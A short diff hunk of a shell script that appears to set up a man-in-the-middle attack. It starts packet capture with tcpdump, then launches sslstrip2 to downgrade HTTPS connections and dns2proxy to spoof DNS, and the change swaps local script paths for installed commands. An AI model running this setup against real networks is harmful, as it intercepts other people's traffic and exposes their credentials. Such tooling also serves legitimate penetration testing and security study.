@@ -49,10 +49,10 @@ echo "Starting tcpdump"
 sudo exo-open --launch TerminalEmulator "tcpdump -i $iface -w $logfldr/tcpdump.pcap"
 sleep 3
 echo "Starting ssltrip2"
-sudo exo-open --launch TerminalEmulator "python ./sslstrip2/sslstrip.py -p -w $logfldr/sslstrip.log -k -l 5649"
+sudo exo-open --launch TerminalEmulator "sslstrip2 -p -w $logfldr/sslstrip.log -k -l 5649"
 sleep 3
 echo "Starting dns2proxy"
-cd ./dns2proxy/ && sudo exo-open --launch TerminalEmulator "python dns2proxy.py"
+dns2proxy
 clear
 }
 
